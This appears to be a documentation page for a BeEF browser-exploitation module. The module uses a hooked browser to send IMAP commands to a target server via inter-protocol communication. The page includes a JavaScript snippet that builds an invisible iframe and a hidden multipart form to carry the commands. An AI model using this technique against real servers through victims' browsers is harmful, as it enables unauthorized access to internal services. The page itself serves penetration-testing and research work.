## Summary

* **Objective**: send commands to an IMAP4 server using inter-protocol communication
* **Authors**: jgaliana, wade
* **Browsers**: Firefox, Chrome, Safari, Opera

* [Code](https://github.com/beefproject/beef/tree/master/modules/ipec/inter_protocol_imap)

## Internal Working

Note: browser port banning is denying connections to default IMAP port 143.

Uses an iframe with multipart form data to send commands to IMAP server


```js

var target = "http://" + server + ":" + port + "/abc.html";
var iframe = beef.dom.createInvisibleIframe();

var form = document.createElement('form');
form.setAttribute('name', 'data');
form.setAttribute('action', target);
form.setAttribute('method', 'post');
form.setAttribute('enctype', 'multipart/form-data');

var input = document.createElement('input');
input.setAttribute('id', 'data1')
input.setAttribute('name', 'data1')
input.setAttribute('type', 'hidden');
input.setAttribute('value', commands);
form.appendChild(input);

```

## References

https://e1tips.com/2014/03/17/allow-firefox-chrome-to-access-restricted-ports/

## Feedback

Online works when the port is not blocked by the browser.
